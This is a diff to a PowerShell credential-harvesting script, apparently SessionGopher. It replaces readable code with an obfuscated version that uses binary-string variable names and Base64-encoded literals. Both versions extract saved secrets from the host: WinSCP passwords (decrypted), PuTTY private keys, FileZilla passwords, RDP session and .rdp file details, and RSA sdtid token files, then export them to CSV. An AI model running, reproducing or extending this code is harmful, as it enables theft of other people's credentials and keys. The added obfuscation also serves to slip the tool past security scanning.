-    [void]$vPIjdrTXjYCbuew.Add($XwBbJ9GgChBoYK9)
-
-  } # For each Session in AllRDPSessions
-
-  if ($o) {
-    $vPIjdrTXjYCbuew | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RDP.csv") -NoTypeInformation
+  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUwBlAHMAcwBpAG8AbgBzAA=='))) -Value ${01111101100010010}
+} 
+function _01000111010101101(${_01010010110101111}) { foreach(${01111000010000011} in ${_01010010110101111}) { ${10100110110110011} = 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + 
+    ${01111000010000011} ${01110110100001010} = "" | select -Property Source,Hostname,Username ${01110110100001010}.Source = ${00111110011110111} ${01110110100001010}.Hostname 
+    = (Split-Path ${01111000010000011} -Leaf) ${01110110100001010}.Username = ((gp -Path ${10100110110110011} -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAEgAaQBuAHQA'))) -ErrorAction SilentlyContinue).UsernameHint) 
+    [void]${10001101110101001}.Add(${01110110100001010})
+  } 
+  if ($o) { ${10001101110101001} | Export-CSV -Append -Path (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAEQAUAAuAGMAcwB2AA==')))) -NoTypeInformation
   } else {
-    Write-Output "Microsoft Remote Desktop (RDP) Sessions"
-    $vPIjdrTXjYCbuew | Format-List | Out-String
+    echo 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIAAoAFIARABQACkAIABTAGUAcwBzAGkAbwBuAHMA'))) 
+    ${10001101110101001} | fl | Out-String
   }
-
-
-  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Sessions" -Value $vPIjdrTXjYCbuew
-
-} #ProcessRDPLocal
-
-function ProcessWinSCPLocal($VTxZ9WXqTI99p9H) {
-  
-
-  foreach($XqQmLH9cAzise9c in $VTxZ9WXqTI99p9H) {
-
-    $9FvrFXsaeiakTRx = "Microsoft.PowerShell.Core\Registry::" + $XqQmLH9cAzise9c
-
-    $LCObjKFbkLskmuo = "" | Select-Object -Property Source,Session,Hostname,Username,Password
-
-    $LCObjKFbkLskmuo.Source = $9dmptIQvAWIrBtO
-    $LCObjKFbkLskmuo.Session = (Split-Path $XqQmLH9cAzise9c -Leaf)
-    $LCObjKFbkLskmuo.Hostname = ((Get-ItemProperty -Path $9FvrFXsaeiakTRx -Name "Hostname" -ErrorAction SilentlyContinue).Hostname)
-    $LCObjKFbkLskmuo.Username = ((Get-ItemProperty -Path $9FvrFXsaeiakTRx -Name "Username" -ErrorAction SilentlyContinue).Username)
-    $LCObjKFbkLskmuo.Password = ((Get-ItemProperty -Path $9FvrFXsaeiakTRx -Name "Password" -ErrorAction SilentlyContinue).Password)
-
-    if ($LCObjKFbkLskmuo.Password) {
-      $Mw9zPDORgH99mYT = ((Get-ItemProperty -Path (Join-Path $Hive.PSPath "SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security") -Name "UseMasterPassword" -ErrorAction SilentlyContinue).UseMasterPassword)
-
-
-      if (!$Mw9zPDORgH99mYT) {
-          $LCObjKFbkLskmuo.Password = (DecryptWinSCPPassword $LCObjKFbkLskmuo.Hostname $LCObjKFbkLskmuo.Username $LCObjKFbkLskmuo.Password)
-
+  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) 
+  -Value ${10001101110101001}
+} 
+function _10000100100101100(${_01001100010111010}) { foreach(${01111000010000011} in ${_01001100010111010}) { ${00101110011000001} = 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQALgBQAG8AdwBlAHIAUwBoAGUAbABsAC4AQwBvAHIAZQBcAFIAZQBnAGkAcwB0AHIAeQA6ADoA'))) + 
+    ${01111000010000011} ${10101000000111100} = "" | select -Property Source,Session,Hostname,Username,Password ${10101000000111100}.Source = ${00111110011110111} 
+    ${10101000000111100}.Session = (Split-Path ${01111000010000011} -Leaf) ${10101000000111100}.Hostname = ((gp -Path ${00101110011000001} -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) -ErrorAction SilentlyContinue).Hostname) ${10101000000111100}.Username = 
+    ((gp -Path ${00101110011000001} -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBuAGEAbQBlAA=='))) -ErrorAction 
+    SilentlyContinue).Username) ${10101000000111100}.Password = ((gp -Path ${00101110011000001} -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA=='))) -ErrorAction SilentlyContinue).Password) if (${10101000000111100}.Password) 
+    {
+      ${10110011010010011} = ((gp -Path (Join-Path ${10000101101010100}.PSPath 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwATQBhAHIAdABpAG4AIABQAHIAaQBrAHIAeQBsAFwAVwBpAG4AUwBDAFAAIAAyAFwAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgBcAFMAZQBjAHUAcgBpAHQAeQA=')))) 
+      -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUATQBhAHMAdABlAHIAUABhAHMAcwB3AG8AcgBkAA=='))) -ErrorAction 
+      SilentlyContinue).UseMasterPassword) if (!${10110011010010011}) {
+          ${10101000000111100}.Password = (_00111011011010000 ${10101000000111100}.Hostname ${10101000000111100}.Username ${10101000000111100}.Password)
       } else {
-          $LCObjKFbkLskmuo.Password = "Saved in session, but master password prevents plaintext recovery"
+          ${10101000000111100}.Password = 
+          $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAHYAZQBkACAAaQBuACAAcwBlAHMAcwBpAG8AbgAsACAAYgB1AHQAIABtAGEAcwB0AGUAcgAgAHAAYQBzAHMAdwBvAHIAZAAgAHAAcgBlAHYAZQBuAHQAcwAgAHAAbABhAGkAbgB0AGUAeAB0ACAAcgBlAGMAbwB2AGUAcgB5AA==')))
       }
     }
-
-
-    [void]$d9zjC9MrnEqjuDK.Add($LCObjKFbkLskmuo)
-
-  } # For each Session in AllWinSCPSessions
-
-  if ($o) {
-    $d9zjC9MrnEqjuDK | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\WinSCP.csv") -NoTypeInformation
+    [void]${00010100001000100}.Add(${10101000000111100})
+  } 
+  if ($o) { ${00010100001000100} | Export-CSV -Append -Path (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABXAGkAbgBTAEMAUAAuAGMAcwB2AA==')))) -NoTypeInformation
   } else {
-    Write-Output "WinSCP Sessions"
-    $d9zjC9MrnEqjuDK | Format-List | Out-String
+    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) ${00010100001000100} | fl | Out-String
   }
-
-
-  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "WinSCP Sessions" -Value $d9zjC9MrnEqjuDK
-
-} # ProcessWinSCPLocal
-
-function ProcesssdtidFile($YJbRCYRyMeA9xLO) {
-
-  foreach ($Path in $YJbRCYRyMeA9xLO.VersionInfo.FileName) {
-
-    $Kniz9WPQzpVdpxF = "" | Select-Object -Property "Source","Path"
-
-    $Kniz9WPQzpVdpxF."Source" = $9dmptIQvAWIrBtO
-    $Kniz9WPQzpVdpxF."Path" = $Path
-
-    [void]$aLapaagzarVqLxc.Add($Kniz9WPQzpVdpxF)
-
+  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AUwBDAFAAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${00010100001000100}
+} 
+function _10101010000011011(${_10101111001001101}) { foreach (${10010001010110110} in ${_10101111001001101}.VersionInfo.FileName) { ${00010111001111101} = "" | select 
+    -Property 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) 
+    ${00010111001111101}."Source" = ${00111110011110111} ${00010111001111101}."Path" = ${10010001010110110} [void]${01110111110000000}.Add(${00010111001111101})
   }
-
-  if ($aLapaagzarVqLxc.count -gt 0) {
-
-    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "sdtid Files" -Value $aLapaagzarVqLxc
-
-    if ($o) {
-      $aLapaagzarVqLxc | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\RSA sdtid Files.csv") -NoTypeInformation
+  if (${01110111110000000}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBkAHQAaQBkACAARgBpAGwAZQBzAA=='))) -Value ${01110111110000000} if ($o) {
+      ${01110111110000000} | select * | Export-CSV -Append -Path (${10101001001011011} + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABSAFMAQQAgAHMAZAB0AGkAZAAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
     } else {
-      Write-Output "RSA Tokens (sdtid)"
-      $aLapaagzarVqLxc | Select-Object * | Format-List | Out-String
+      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBTAEEAIABUAG8AawBlAG4AcwAgACgAcwBkAHQAaQBkACkA'))) ${01110111110000000} | select * | fl | 
+      Out-String
     }
-
   }
-
-} # Process sdtid File
-
-function ProcessRDPFile($eWNrJqqNTZjoBak) {
-  
-
-  foreach ($Path in $eWNrJqqNTZjoBak.VersionInfo.FileName) {
-    
-    $bLDXVyDTtbAVfll = "" | Select-Object -Property "Source","Path","Hostname","Gateway","Prompts for Credentials","Administrative Session"
-
-    $bLDXVyDTtbAVfll."Source" = (Hostname)
-
-
-    $bLDXVyDTtbAVfll."Path" = $Path 
-    $bLDXVyDTtbAVfll."Hostname" = try { (Select-String -Path $Path -Pattern "full address:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-    $bLDXVyDTtbAVfll."Gateway" = try { (Select-String -Path $Path -Pattern "gatewayhostname:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-    $bLDXVyDTtbAVfll."Administrative Session" = try { (Select-String -Path $Path -Pattern "administrative session:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-    $bLDXVyDTtbAVfll."Prompts for Credentials" = try { (Select-String -Path $Path -Pattern "prompt for credentials:[a-z]:(.*)").Matches.Groups[1].Value } catch {}
-
-    if (!$bLDXVyDTtbAVfll."Administrative Session" -or !$bLDXVyDTtbAVfll."Administrative Session" -eq 0) {
-      $bLDXVyDTtbAVfll."Administrative Session" = "Does not connect to admin session on remote host"
+} 
+function _01001011101110110(${_00111011000101000}) { foreach (${10010001010110110} in ${_00111011000101000}.VersionInfo.FileName) { ${00101110100100110} = "" | select 
+    -Property 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBhAHQAZQB3AGEAeQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AbQBwAHQAcwAgAGYAbwByACAAQwByAGUAZABlAG4AdABpAGEAbABzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAUwBlAHMAcwBpAG8AbgA='))) 
+    ${00101110100100110}."Source" = (Hostname) ${00101110100100110}."Path" = ${10010001010110110} ${00101110100100110}."Hostname" = try { (sls -Path ${10010001010110110} 
+    -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AGwAbAAgAGEAZABkAHIAZQBzAHMAOgBbAGEALQB6AF0AOgAoAC4AKgApAA==')))).Matches.Groups[1].Value } 
+    catch {} ${00101110100100110}."Gateway" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBhAHQAZQB3AGEAeQBoAG8AcwB0AG4AYQBtAGUAOgBbAGEALQB6AF0AOgAoAC4AKgApAA==')))).Matches.Groups[1].Value } 
+    catch {} ${00101110100100110}."Administrative Session" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGkAcwB0AHIAYQB0AGkAdgBlACAAcwBlAHMAcwBpAG8AbgA6AFsAYQAtAHoAXQA6ACgALgAqACkA')))).Matches.Groups[1].Value 
+    } catch {}
+    ${00101110100100110}."Prompts for Credentials" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAG8AbQBwAHQAIABmAG8AcgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwA6AFsAYQAtAHoAXQA6ACgALgAqACkA')))).Matches.Groups[1].Value 
+    } catch {}
+    if (!${00101110100100110}."Administrative Session" -or !${00101110100100110}."Administrative Session" -eq 0) { ${00101110100100110}."Administrative Session" = 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAGUAcwAgAG4AbwB0ACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAgAGEAZABtAGkAbgAgAHMAZQBzAHMAaQBvAG4AIABvAG4AIAByAGUAbQBvAHQAZQAgAGgAbwBzAHQA')))
     } else {
-      $bLDXVyDTtbAVfll."Administrative Session" = "Connects to admin session on remote host"
+      ${00101110100100110}."Administrative Session" = 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AbgBlAGMAdABzACAAdABvACAAYQBkAG0AaQBuACAAcwBlAHMAcwBpAG8AbgAgAG8AbgAgAHIAZQBtAG8AdABlACAAaABvAHMAdAA=')))
     }
-    if (!$bLDXVyDTtbAVfll."Prompts for Credentials" -or $bLDXVyDTtbAVfll."Prompts for Credentials" -eq 0) {
-      $bLDXVyDTtbAVfll."Prompts for Credentials" = "No"
+    if (!${00101110100100110}."Prompts for Credentials" -or ${00101110100100110}."Prompts for Credentials" -eq 0) { ${00101110100100110}."Prompts for Credentials" = "No"
     } else {
-      $bLDXVyDTtbAVfll."Prompts for Credentials" = "Yes"
+      ${00101110100100110}."Prompts for Credentials" = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBlAHMA')))
     }
-
-    [void]$NpEpKAllBWZHx9K.Add($bLDXVyDTtbAVfll)
-
+    [void]${00011101111001111}.Add(${00101110100100110})
   }
-
-  if ($NpEpKAllBWZHx9K.count -gt 0) {
-
-    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "RDP Files" -Value $NpEpKAllBWZHx9K
-
-    if ($o) {
-      $NpEpKAllBWZHx9K | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\Microsoft rdp Files.csv") -NoTypeInformation
+  if (${00011101111001111}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBEAFAAIABGAGkAbABlAHMA'))) -Value ${00011101111001111} if ($o) {
+      ${00011101111001111} | select * | Export-CSV -Append -Path (${10101001001011011} + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABNAGkAYwByAG8AcwBvAGYAdAAgAHIAZABwACAARgBpAGwAZQBzAC4AYwBzAHYA')))) -NoTypeInformation
     } else {
-      Write-Output "Microsoft RDP Connection Files (.rdp)"
-      $NpEpKAllBWZHx9K | Select-Object * | Format-List | Out-String
+      echo 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAGMAcgBvAHMAbwBmAHQAIABSAEQAUAAgAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABGAGkAbABlAHMAIAAoAC4AcgBkAHAAKQA='))) 
+      ${00011101111001111} | select * | fl | Out-String
     }
-
   }
-
-} # Process RDP File
-
-function ProcessPPKFile($YtRxwozAYQBG9wb) {
-
-
-  foreach ($Path in $YtRxwozAYQBG9wb.VersionInfo.FileName) {
-
-
-    $NfcomAmiyeNdChC = "" | Select-Object -Property "Source","Path","Protocol","Comment","Private Key Encryption","Private Key","Private MAC"
-
-    $NfcomAmiyeNdChC."Source" = (Hostname)
-
-
-    $NfcomAmiyeNdChC."Path" = $Path
-
-    $NfcomAmiyeNdChC."Protocol" = try { (Select-String -Path $Path -Pattern ": (.*)" -Context 0,0).Matches.Groups[1].Value } catch {}
-    $NfcomAmiyeNdChC."Private Key Encryption" = try { (Select-String -Path $Path -Pattern "Encryption: (.*)").Matches.Groups[1].Value } catch {}
-    $NfcomAmiyeNdChC."Comment" = try { (Select-String -Path $Path -Pattern "Comment: (.*)").Matches.Groups[1].Value } catch {}
-    $9AVgsGqdEND9fXu = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)").Matches.Groups[1].Value } catch {}
-    $NfcomAmiyeNdChC."Private Key" = try { (Select-String -Path $Path -Pattern "Private-Lines: (.*)" -Context 0,$9AVgsGqdEND9fXu).Context.PostContext -Join "" } catch {}
-    $NfcomAmiyeNdChC."Private MAC" = try { (Select-String -Path $Path -Pattern "Private-MAC: (.*)").Matches.Groups[1].Value } catch {}
-
-
-    [void]$uTLibPDMibhEOhJ.Add($NfcomAmiyeNdChC)
-
+} 
+function _00101010010011101(${_10001100001011101}) { foreach (${10010001010110110} in ${_10001100001011101}.VersionInfo.FileName) { ${01110001100011110} = "" | select 
+    -Property 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARQBuAGMAcgB5AHAAdABpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAEsAZQB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAgAE0AQQBDAA=='))) 
+    ${01110001100011110}."Source" = (Hostname) ${01110001100011110}."Path" = ${10010001010110110} ${01110001100011110}."Protocol" = try { (sls -Path ${10010001010110110} 
+    -Pattern $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OgAgACgALgAqACkA'))) -Context 0,0).Matches.Groups[1].Value } catch {} 
+    ${01110001100011110}."Private Key Encryption" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAcgB5AHAAdABpAG8AbgA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {} 
+    ${01110001100011110}."Comment" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {} ${00001010100101010} = try { 
+    (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAEwAaQBuAGUAcwA6ACAAKAAuACoAKQA=')))).Matches.Groups[1].Value } catch {} 
+    ${01110001100011110}."Private Key" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAEwAaQBuAGUAcwA6ACAAKAAuACoAKQA='))) -Context 
+    0,${00001010100101010}).Context.PostContext -Join "" } catch {} ${01110001100011110}."Private MAC" = try { (sls -Path ${10010001010110110} -Pattern 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQAtAE0AQQBDADoAIAAoAC4AKgApAA==')))).Matches.Groups[1].Value } catch {} 
+    [void]${10100011010111001}.Add(${01110001100011110})
   }
-
-  if ($uTLibPDMibhEOhJ.count -gt 0) {
-
-    $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "PPK Files" -Value $uTLibPDMibhEOhJ
-
-    if ($o) {
-      $uTLibPDMibhEOhJ | Select-Object * | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\PuTTY ppk Files.csv") -NoTypeInformation
+  if (${10100011010111001}.count -gt 0) { ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABQAEsAIABGAGkAbABlAHMA'))) -Value ${10100011010111001} if ($o) {
+      ${10100011010111001} | select * | Export-CSV -Append -Path (${10101001001011011} + 
+      $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABQAHUAVABUAFkAIABwAHAAawAgAEYAaQBsAGUAcwAuAGMAcwB2AA==')))) -NoTypeInformation
     } else {
-      Write-Output "PuTTY Private Key Files (.ppk)"
-      $uTLibPDMibhEOhJ | Select-Object * | Format-List | Out-String
+      echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AFQAVABZACAAUAByAGkAdgBhAHQAZQAgAEsAZQB5ACAARgBpAGwAZQBzACAAKAAuAHAAcABrACkA'))) 
+      ${10100011010111001} | select * | fl | Out-String
     }
-
   }
-
-} # Process PPK File
-
-function ProcessFileZillaFile($DnZtKlK9NayrWx9) {
-
-
-  foreach($YOuiISCQsVHWWcV in $DnZtKlK9NayrWx9.SelectNodes('//FileZilla3/Servers/Server')) {
-
-      $N9fGnbXbEGgKygO = @{}
-
-
-      $YOuiISCQsVHWWcV.ChildNodes | ForEach-Object {
-
-          $N9fGnbXbEGgKygO["Source"] = $9dmptIQvAWIrBtO
-
-          if ($_.InnerText) {
-              if ($_.Name -eq "Pass") {
-                  $N9fGnbXbEGgKygO["Password"] = $_.InnerText
+} 
+function _01111010001110000(${_01110110011100001}) { foreach(${01100000010100001} in 
+  ${_01110110011100001}.SelectNodes($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwAvAEYAaQBsAGUAWgBpAGwAbABhADMALwBTAGUAcgB2AGUAcgBzAC8AUwBlAHIAdgBlAHIA'))))) 
+  {
+      ${10110001001000100} = @{} ${01100000010100001}.ChildNodes | % { 
+          ${10110001001000100}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUA')))] = ${00111110011110111} if ($_.InnerText) {
+              if ($_.Name -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwA=')))) { 
+                  ${10110001001000100}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHMAcwB3AG8AcgBkAA==')))] = $_.InnerText
               } else {
-
-                  $N9fGnbXbEGgKygO[$_.Name] = $_.InnerText
+                  ${10110001001000100}[$_.Name] = $_.InnerText
               }
-              
           }
-
       }
-
-
-    [void]$EpFdJVExPKHuYcZ.Add((New-Object PSObject -Property $N9fGnbXbEGgKygO | Select-Object -Property * -ExcludeProperty "#text",LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
-     
-  } # ForEach FileZillaSession in FileZillaXML.SelectNodes()
-  
-
-  foreach ($XqQmLH9cAzise9c in $EpFdJVExPKHuYcZ) {
-      $XqQmLH9cAzise9c.Password = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XqQmLH9cAzise9c.Password))
-      if ($XqQmLH9cAzise9c.Protocol -eq "0") {
-        $XqQmLH9cAzise9c.Protocol = "Use FTP over TLS if available"
-      } elseif ($XqQmLH9cAzise9c.Protocol -eq 1) {
-        $XqQmLH9cAzise9c.Protocol = "Use SFTP"
-      } elseif ($XqQmLH9cAzise9c.Protocol -eq 3) {
-        $XqQmLH9cAzise9c.Protocol = "Require implicit FTP over TLS"
-      } elseif ($XqQmLH9cAzise9c.Protocol -eq 4) {
-        $XqQmLH9cAzise9c.Protocol = "Require explicit FTP over TLS"
-      } elseif ($XqQmLH9cAzise9c.Protocol -eq 6) {
-        $XqQmLH9cAzise9c.Protocol = "Only use plain FTP (insecure)"
+    [void]${10111100100011001}.Add((New-Object PSObject -Property ${10110001001000100} | select -Property * -ExcludeProperty 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwB0AGUAeAB0AA=='))),LogonType,Type,BypassProxy,SyncBrowsing,PasvMode,DirectoryComparison,MaximumMultipleConnections,EncodingType,TimezoneOffset,Colour))
+  } 
+  foreach (${01111000010000011} in ${10111100100011001}) { ${01111000010000011}.Password = 
+      [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(${01111000010000011}.Password)) if (${01111000010000011}.Protocol -eq "0") {
+        ${01111000010000011}.Protocol = 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABGAFQAUAAgAG8AdgBlAHIAIABUAEwAUwAgAGkAZgAgAGEAdgBhAGkAbABhAGIAbABlAA==')))
+      } elseif (${01111000010000011}.Protocol -eq 1) {
+        ${01111000010000011}.Protocol = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABTAEYAVABQAA==')))
+      } elseif (${01111000010000011}.Protocol -eq 3) {
+        ${01111000010000011}.Protocol = 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBpAHIAZQAgAGkAbQBwAGwAaQBjAGkAdAAgAEYAVABQACAAbwB2AGUAcgAgAFQATABTAA==')))
+      } elseif (${01111000010000011}.Protocol -eq 4) {
+        ${01111000010000011}.Protocol = 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBpAHIAZQAgAGUAeABwAGwAaQBjAGkAdAAgAEYAVABQACAAbwB2AGUAcgAgAFQATABTAA==')))
+      } elseif (${01111000010000011}.Protocol -eq 6) {
+        ${01111000010000011}.Protocol = 
+        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBuAGwAeQAgAHUAcwBlACAAcABsAGEAaQBuACAARgBUAFAAIAAoAGkAbgBzAGUAYwB1AHIAZQApAA==')))
       } 
   }
-
-  if ($o) {
-    $EpFdJVExPKHuYcZ | Export-CSV -Append -Path ($zPRwy9FdrtsVRzg + "\FileZilla.csv") -NoTypeInformation
+  if ($o) { ${10111100100011001} | Export-CSV -Append -Path (${10101001001011011} + 
+    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABGAGkAbABlAFoAaQBsAGwAYQAuAGMAcwB2AA==')))) -NoTypeInformation
   } else {
-    Write-Output "FileZilla Sessions"
-    $EpFdJVExPKHuYcZ | Format-List | Out-String
+    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBaAGkAbABsAGEAIABTAGUAcwBzAGkAbwBuAHMA'))) ${10111100100011001} | fl | Out-String
   }
-
-
-  $V9joSisJDLQPInP | Add-Member -MemberType NoteProperty -Name "FileZilla Sessions" -Value $EpFdJVExPKHuYcZ
-
-} # ProcessFileZillaFile
-
-function ProcessSuperPuTTYFile($VhtJEeNXNsVmvvQ) {
-
-  foreach($LZUdNtxVeir9p9W in $VhtJEeNXNsVmvvQ.ArrayOfSessionData.SessionData) {
-
-    foreach ($9otnrfkDzoykjUa in $LZUdNtxVeir9p9W) { 
-      if ($9otnrfkDzoykjUa -ne $null) {
-
-        $UmBMwIGmSTwtYin = "" | Select-Object -Property "Source","SessionId","SessionName","Host","Username","ExtraArgs","Port","Putty Session"
-
-        $UmBMwIGmSTwtYin."Source" = $9dmptIQvAWIrBtO
-        $UmBMwIGmSTwtYin."SessionId" = $9otnrfkDzoykjUa.SessionId
-        $UmBMwIGmSTwtYin."SessionName" = $9otnrfkDzoykjUa.SessionName
-        $UmBMwIGmSTwtYin."Host" = $9otnrfkDzoykjUa.Host
-        $UmBMwIGmSTwtYin."Username" = $9otnrfkDzoykjUa.Username
-        $UmBMwIGmSTwtYin."ExtraArgs" = $9otnrfkDzoykjUa.ExtraArgs
-        $UmBMwIGmSTwtYin."Port" = $9otnrfkDzoykjUa.Port
-        $UmBMwIGmSTwtYin."PuTTY Session" = $9otnrfkDzoykjUa.PuttySession
-
-        [void]$muzrifeMsMRPGSl.Add($UmBMwIGmSTwtYin)
+  ${10000100110110100} | Add-Member -MemberType NoteProperty -Name 
+  $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBaAGkAbABsAGEAIABTAGUAcwBzAGkAbwBuAHMA'))) -Value ${10111100100011001}
+} 
